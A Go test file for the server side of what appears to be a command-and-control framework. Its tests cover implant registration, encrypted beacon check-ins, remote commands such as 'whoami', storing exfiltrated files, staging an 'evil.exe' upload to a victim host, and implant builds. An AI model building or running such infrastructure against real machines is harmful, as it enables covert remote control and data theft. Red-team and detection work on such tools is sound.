package server

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"c2/models"
	"c2/protocol"
	"c2/store"
)

// noopLM is a no-op listenerStarter for unit tests.
type noopLM struct{}

func (n *noopLM) Start(l *models.Listener, h http.Handler) error { return nil }
func (n *noopLM) Stop(id uint32) error                           { return nil }

type nopPersister struct{}

func (n *nopPersister) SaveListeners(_ []*models.Listener)              {}
func (n *nopPersister) SaveBeacons(_ []*models.Beacon)                  {}
func (n *nopPersister) SaveEvents(_ []*models.Event)                    {}
func (n *nopPersister) SaveTerminals(_ map[uint32]*models.TerminalState) {}
func (n *nopPersister) SaveLoot(_ []*models.ExfilEntry)                  {}
func (n *nopPersister) SaveRSAKey(_ *rsa.PrivateKey)                     {}

func newTestStore(t *testing.T) *store.Store {
	t.Helper()
	s, err := store.New(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	t.Cleanup(func() { s.Close() })
	return s
}

func setup(t *testing.T) (*Handler, *store.Store, *rsa.PrivateKey) {
	t.Helper()
	priv, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("RSA keygen: %v", err)
	}
	s := newTestStore(t)
	return NewHandler(s, priv, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, nil), s, priv
}

func setupTestHandler(t *testing.T) (*Handler, *models.Beacon, *rsa.PrivateKey) {
	t.Helper()
	priv, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("RSA keygen: %v", err)
	}
	s := newTestStore(t)
	h := NewHandler(s, priv, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, nil)
	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 1, SessionKey: sessionKey, Sleep: 5, Hostname: "test-host"})
	beacon := s.GetBeacon(1)
	return h, beacon, priv
}

func newTestHandler(t *testing.T) *Handler {
	t.Helper()
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatal(err)
	}
	return NewHandler(newTestStore(t), key, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, nil)
}

func TestHandleGetPubKey(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("GET", "/api/pubkey", nil)
	w := httptest.NewRecorder()
	h.HandleGetPubKey(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	block, _ := pem.Decode(w.Body.Bytes())
	if block == nil || block.Type != "PUBLIC KEY" {
		t.Fatal("expected PUBLIC KEY PEM block")
	}
}

func TestHandleRegister(t *testing.T) {
	h, s, priv := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)

	meta := &models.ImplantMetadata{
		ID:         0xABCD,
		SessionKey: sessionKey,
		Sleep:      5,
		Hostname:   "victim-pc",
	}
	plaintext := protocol.EncodeImplantMetadata(meta)
	encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &priv.PublicKey, plaintext, nil)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	req := httptest.NewRequest("POST", "/api/register", bytes.NewReader(encrypted))
	w := httptest.NewRecorder()
	h.HandleRegister(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	b := s.GetBeacon(0xABCD)
	if b == nil {
		t.Fatal("beacon not in store after register")
	}
	if b.Hostname != "victim-pc" {
		t.Fatalf("hostname: want victim-pc, got %s", b.Hostname)
	}
}

func TestHandleCheckin_ReturnsEncryptedNOP(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 77, SessionKey: sessionKey, Sleep: 5})

	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 77)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	body := w.Body.Bytes()
	// IV(16) + HMAC(32) + AES-CBC(16-byte NOP header padded to 32) = 80 bytes
	if len(body) != 80 {
		t.Fatalf("expected 80 bytes, got %d", len(body))
	}

	plaintext, err := protocol.Decrypt(sessionKey, body)
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	hdr, err := protocol.DecodeHeader(plaintext)
	if err != nil {
		t.Fatalf("DecodeHeader: %v", err)
	}
	if hdr.Type != protocol.TaskNOP {
		t.Fatalf("expected NOP (0), got type %d", hdr.Type)
	}
}

func TestHandleCheckin_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)
	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 0xFFFF)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleCheckin_BodyTooShort(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader([]byte{0x01}))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

// Ensure io is used (imported via httptest transitively, but explicit reference avoids lint)
var _ = io.Discard

func TestHandleCheckin_ReturnsTask(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 88, SessionKey: sessionKey, Sleep: 5})

	taskData := protocol.EncodeRunReq("whoami")
	s.QueueTask(&models.Task{
		Label:    42,
		BeaconID: 88,
		Type:     protocol.TaskRun,
		Code:     0,
		Data:     taskData,
		Status:   models.TaskStatusPending,
	})

	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 88)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	plaintext, err := protocol.Decrypt(sessionKey, w.Body.Bytes())
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	if len(plaintext) < 16 {
		t.Fatalf("plaintext too short: %d bytes", len(plaintext))
	}

	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		t.Fatalf("DecodeHeader: %v", err)
	}
	if hdr.Type != protocol.TaskRun {
		t.Fatalf("expected TaskRun (%d), got %d", protocol.TaskRun, hdr.Type)
	}
	if hdr.Label != 42 {
		t.Fatalf("expected label 42, got %d", hdr.Label)
	}

	cmd, err := protocol.DecodeRunRep(plaintext[16:])
	if err != nil {
		t.Fatalf("DecodeRunRep: %v", err)
	}
	if cmd != "whoami" {
		t.Fatalf("expected whoami, got %q", cmd)
	}
}

func TestHandleResult_ValidPayload(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 99, SessionKey: sessionKey, Sleep: 5})
	s.QueueTask(&models.Task{Label: 7, BeaconID: 99, Type: 12, Status: models.TaskStatusPending})
	s.GetNextTask(99) // marks SENT

	hdr := protocol.EncodeHeader(protocol.TaskHeader{Type: 12, Label: 7})
	output := protocol.EncodeRunReq("operator\n")
	plaintext := append(hdr, output...)

	encrypted, err := protocol.Encrypt(sessionKey, plaintext)
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}

	body := make([]byte, 4+len(encrypted))
	binary.LittleEndian.PutUint32(body[:4], 99)
	copy(body[4:], encrypted)

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	results := s.GetResults(99)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Output != "operator\n" {
		t.Fatalf("output mismatch: got %q", results[0].Output)
	}
}

func TestHandleResult_BadHMAC(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 100, SessionKey: sessionKey, Sleep: 5})

	body := make([]byte, 4+80)
	binary.LittleEndian.PutUint32(body[:4], 100)
	rand.Read(body[4:]) // garbage encrypted payload

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleResult_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)

	body := make([]byte, 4)
	binary.LittleEndian.PutUint32(body, 0xDEAD)

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleQueueTask_RunCommand(t *testing.T) {
	h, s, _ := setup(t)
	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 5, SessionKey: sessionKey, Sleep: 5})

	body := strings.NewReader(`{"beacon_id":5,"type":12,"code":0,"args":"whoami"}`)
	req := httptest.NewRequest("POST", "/api/task", body)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp struct {
		Label uint32 `json:"label"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp.Label == 0 {
		t.Fatal("expected non-zero label")
	}

	task := s.GetNextTask(5)
	if task == nil {
		t.Fatal("expected task in queue")
	}
	if task.Type != 12 {
		t.Fatalf("expected type 12, got %d", task.Type)
	}
}

func TestHandleQueueTask_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)
	body := strings.NewReader(`{"beacon_id":9999,"type":12,"code":0,"args":"whoami"}`)
	req := httptest.NewRequest("POST", "/api/task", body)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleQueueTask_BadJSON(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("POST", "/api/task", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleGetSessions_ReturnsJSON(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 10, SessionKey: make([]byte, 32), Hostname: "box1", Sleep: 60})
	s.RegisterBeacon(&models.ImplantMetadata{ID: 11, SessionKey: make([]byte, 32), Hostname: "box2", Sleep: 60})

	req := httptest.NewRequest("GET", "/api/sessions", nil)
	w := httptest.NewRecorder()
	h.HandleGetSessions(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		ID uint32 `json:"id"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 2 {
		t.Fatalf("expected 2 beacons, got %d", len(resp))
	}
}

func TestHandleGetResults_ReturnsSince(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 20, SessionKey: make([]byte, 32), Sleep: 60})
	s.StoreResult(&models.Result{Label: 1, BeaconID: 20, Output: "root", ReceivedAt: time.Now()})

	req := httptest.NewRequest("GET", "/api/results/20?since=0", nil)
	req.SetPathValue("id", "20")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		Output string `json:"output"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 1 {
		t.Fatalf("expected 1 result, got %d", len(resp))
	}
	if resp[0].Output != "root" {
		t.Fatalf("expected root, got %q", resp[0].Output)
	}
}

func TestHandleGetResults_FutureSince(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 30, SessionKey: make([]byte, 32), Sleep: 60})
	s.StoreResult(&models.Result{Label: 2, BeaconID: 30, Output: "data", ReceivedAt: time.Now()})

	futureTs := time.Now().Add(time.Hour).Unix()
	req := httptest.NewRequest("GET", fmt.Sprintf("/api/results/30?since=%d", futureTs), nil)
	req.SetPathValue("id", "30")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	var resp []struct{ Output string `json:"output"` }
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 0 {
		t.Fatalf("expected 0 results with future since, got %d", len(resp))
	}
}

func TestHandleKillBeacon_queuesKillTask(t *testing.T) {
	h := newTestHandler(t)
	h.store.RegisterBeacon(&models.ImplantMetadata{
		ID: 42, SessionKey: make([]byte, 32), Sleep: 5,
	})

	req := httptest.NewRequest("DELETE", "/api/sessions/42", nil)
	req.SetPathValue("id", "42")
	w := httptest.NewRecorder()
	h.HandleKillBeacon(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204 NoContent, got %d", w.Code)
	}

	task := h.store.GetNextTask(42)
	if task == nil {
		t.Fatal("kill task must be queued")
	}
	if task.Type != protocol.TaskExit {
		t.Fatalf("expected TaskExit (%d), got %d", protocol.TaskExit, task.Type)
	}
	if task.Code != protocol.CodeExitNormal {
		t.Fatalf("expected CodeExitNormal (%d), got %d", protocol.CodeExitNormal, task.Code)
	}
}

func TestHandleKillBeacon_unknownBeacon(t *testing.T) {
	h := newTestHandler(t)
	req := httptest.NewRequest("DELETE", "/api/sessions/999", nil)
	req.SetPathValue("id", "999")
	w := httptest.NewRecorder()
	h.HandleKillBeacon(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404 for unknown beacon, got %d", w.Code)
	}
}

func TestHandleCheckin_autoRemovesBeaconAfterKillTask(t *testing.T) {
	h := newTestHandler(t)

	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, sessionKey); err != nil {
		t.Fatal(err)
	}

	h.store.RegisterBeacon(&models.ImplantMetadata{
		ID:         55,
		SessionKey: sessionKey,
		Sleep:      5,
	})
	h.store.QueueTask(&models.Task{
		Label:     9999,
		BeaconID:  55,
		Type:      protocol.TaskExit,
		Code:      protocol.CodeExitNormal,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	// Checkin body: 4-byte little-endian beacon ID
	body := make([]byte, 4)
	binary.LittleEndian.PutUint32(body, 55)
	req := httptest.NewRequest(http.MethodPost, "/api/checkin", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 from checkin, got %d: %s", w.Code, w.Body.String())
	}
	if h.store.GetBeacon(55) != nil {
		t.Fatal("beacon must be removed from store after kill task delivery")
	}
}

func TestHandleListListeners_Default(t *testing.T) {
	h, s, _ := setup(t)
	s.AddListener(&models.Listener{
		Name: "default-http", Scheme: "http", Host: "127.0.0.1",
		BindAddr: "0.0.0.0", Port: 8080, IsDefault: true,
	})

	req := httptest.NewRequest("GET", "/api/listeners", nil)
	w := httptest.NewRecorder()
	h.HandleListListeners(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var resp []map[string]interface{}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(resp) != 1 {
		t.Fatalf("expected 1 listener, got %d", len(resp))
	}
	if resp[0]["scheme"] != "http" {
		t.Fatalf("expected http scheme, got %v", resp[0]["scheme"])
	}
}

func TestHandleCreateListener_HTTP(t *testing.T) {
	h, s, _ := setup(t)
	body := `{"name":"extra","scheme":"http","host":"10.0.0.1","port":9001}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)

	if w.Code != 201 {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]interface{}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["id"] == nil {
		t.Fatal("expected id in response")
	}
	if len(s.ListListeners()) != 1 {
		t.Fatalf("expected 1 listener in store, got %d", len(s.ListListeners()))
	}
}

func TestHandleCreateListener_InvalidScheme(t *testing.T) {
	h, _, _ := setup(t)
	body := `{"name":"bad","scheme":"ftp","host":"10.0.0.1","port":21}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)
	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleCreateListener_MissingHost(t *testing.T) {
	h, _, _ := setup(t)
	body := `{"name":"nohost","scheme":"http","port":9002}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)
	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleDeleteListener_Default(t *testing.T) {
	h, s, _ := setup(t)
	s.AddListener(&models.Listener{
		Name: "default-http", Scheme: "http", Host: "127.0.0.1",
		Port: 8080, IsDefault: true,
	})
	id := s.ListListeners()[0].ID

	req := httptest.NewRequest("DELETE", fmt.Sprintf("/api/listeners/%d", id), nil)
	req.SetPathValue("id", fmt.Sprintf("%d", id))
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)

	if w.Code != 403 {
		t.Fatalf("expected 403 for default listener, got %d", w.Code)
	}
}

func TestHandleDeleteListener_NotFound(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("DELETE", "/api/listeners/9999", nil)
	req.SetPathValue("id", "9999")
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)
	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeleteListener_OK(t *testing.T) {
	h, s, _ := setup(t)
	l := &models.Listener{Name: "extra", Scheme: "http", Host: "10.0.0.1", Port: 9005}
	s.AddListener(l)

	req := httptest.NewRequest("DELETE", fmt.Sprintf("/api/listeners/%d", l.ID), nil)
	req.SetPathValue("id", fmt.Sprintf("%d", l.ID))
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)

	if w.Code != 204 {
		t.Fatalf("expected 204, got %d", w.Code)
	}
	if s.GetListener(l.ID) != nil {
		t.Fatal("listener still in store after delete")
	}
}

func TestHandleResultExfil(t *testing.T) {
	t.Cleanup(func() { os.RemoveAll("exfil") })

	h, _, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	h.store.RegisterBeacon(&models.ImplantMetadata{ID: 55, SessionKey: sessionKey, Sleep: 5})

	// Build a single-fragment exfil result payload:
	// header: Type=4, Code=0, Flags=FlagLastFragment(8), Label=77, Identifier=0, Length=...
	// data: [uint16 name_len=3]["out"]["HELLO"]
	data := []byte{3, 0, 'o', 'u', 't', 'H', 'E', 'L', 'L', 'O'}
	hdr := protocol.TaskHeader{
		Type:       protocol.TaskFileExfil,
		Flags:      protocol.FlagLastFragment,
		Label:      77,
		Identifier: 0,
		Length:     uint32(len(data)),
	}
	plain := append(protocol.EncodeHeader(hdr), data...)
	enc, err := protocol.Encrypt(sessionKey, plain)
	if err != nil {
		t.Fatal(err)
	}
	body := make([]byte, 4+len(enc))
	binary.LittleEndian.PutUint32(body[:4], uint32(55))
	copy(body[4:], enc)

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/api/result", bytes.NewReader(body))
	h.HandleResult(w, r)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	results := h.store.GetResults(55)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Type != protocol.TaskFileExfil {
		t.Fatalf("expected Type=4, got %d", results[0].Type)
	}
	if results[0].Filename != "out" {
		t.Fatalf("expected Filename 'out', got %q", results[0].Filename)
	}

	diskData, err := os.ReadFile(filepath.Join("exfil", "77_out"))
	if err != nil {
		t.Fatalf("expected exfil/77_out on disk: %v", err)
	}
	if string(diskData) != "HELLO" {
		t.Fatalf("expected disk content 'HELLO', got %q", string(diskData))
	}
}

func TestHandleUpload(t *testing.T) {
	h, beacon, _ := setupTestHandler(t)

	// Build a multipart body with 3 bytes (fits in one chunk)
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	_ = mw.WriteField("beacon_id", fmt.Sprintf("%d", beacon.ID))
	_ = mw.WriteField("dest_path", `C:\Temp\evil.exe`)
	fw, _ := mw.CreateFormFile("file", "evil.exe")
	_, _ = fw.Write([]byte{0xDE, 0xAD, 0xBE})
	mw.Close()

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/api/upload", &buf)
	r.Header.Set("Content-Type", mw.FormDataContentType())
	h.HandleUpload(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["chunks"].(float64) != 1 {
		t.Fatalf("expected 1 chunk, got %v", resp["chunks"])
	}

	task := h.store.GetNextTask(beacon.ID)
	if task == nil {
		t.Fatal("expected a queued task")
	}
	if task.Type != protocol.TaskFileStage {
		t.Fatalf("expected Type=3, got %d", task.Type)
	}
	if task.Flags != protocol.FlagLastFragment {
		t.Fatalf("expected FlagLastFragment, got %d", task.Flags)
	}
	// Fragment 0 data layout: [uint16 path_len][path_bytes][file_bytes]
	if len(task.Data) < 2 {
		t.Fatal("task.Data too short")
	}
	pathLen := int(task.Data[0]) | int(task.Data[1])<<8
	path := string(task.Data[2 : 2+pathLen])
	if path != `C:\Temp\evil.exe` {
		t.Fatalf("expected path 'C:\\Temp\\evil.exe', got %q", path)
	}
	chunk := task.Data[2+pathLen:]
	if !bytes.Equal(chunk, []byte{0xDE, 0xAD, 0xBE}) {
		t.Fatalf("expected chunk {0xDE,0xAD,0xBE}, got %v", chunk)
	}
}

func TestHandleGetDeleteFile(t *testing.T) {
	h, _, _ := setupTestHandler(t)

	// Pre-seed the exfil store and write a temp file
	h.store.MarkExfilDone(55, "secret.txt", 1, 8)
	if err := os.MkdirAll("exfil", 0755); err != nil {
		t.Fatal(err)
	}
	diskPath := filepath.Join("exfil", "55_secret.txt")
	os.WriteFile(diskPath, []byte("treasure"), 0644)
	t.Cleanup(func() { os.RemoveAll("exfil") })

	// GET /api/files/55
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, "/api/files/55", nil)
	r.SetPathValue("label", "55")
	h.HandleGetFile(w, r)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if w.Body.String() != "treasure" {
		t.Fatalf("expected 'treasure', got %q", w.Body.String())
	}

	// DELETE /api/files/55
	w2 := httptest.NewRecorder()
	r2 := httptest.NewRequest(http.MethodDelete, "/api/files/55", nil)
	r2.SetPathValue("label", "55")
	h.HandleDeleteFile(w2, r2)
	if w2.Code != http.StatusNoContent {
		t.Fatalf("expected 204, got %d", w2.Code)
	}
	if h.store.GetExfilFile(55) != nil {
		t.Fatal("expected nil after delete")
	}
	if _, err := os.Stat(diskPath); !os.IsNotExist(err) {
		t.Fatal("expected file to be removed from disk")
	}
}

func TestHandleBuild_NoBeaconSrc(t *testing.T) {
	h, s, _ := setup(t)
	l := &models.Listener{Name: "test", Scheme: "http", Host: "10.0.0.1", Port: 9010}
	s.AddListener(l)

	body := fmt.Sprintf(`{"listener_id":%d,"sleep_ms":5000,"jitter_pct":10}`, l.ID)
	req := httptest.NewRequest("POST", "/api/build", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleBuild(w, req)
	if w.Code != 501 {
		t.Fatalf("expected 501 (no beacon src), got %d", w.Code)
	}
}

func TestChatRateLimitAllowsBurst(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		if !h.chatRateLimit("alice") {
			t.Fatalf("message %d should be allowed", i)
		}
	}
}

func TestChatRateLimitRejectsOverBurst(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		_ = h.chatRateLimit("alice")
	}
	if h.chatRateLimit("alice") {
		t.Fatal("11th message should have been rejected")
	}
}

func TestChatRateLimitPerOperatorIsolated(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		_ = h.chatRateLimit("alice")
	}
	if !h.chatRateLimit("bob") {
		t.Fatal("bob's first message should be allowed")
	}
}
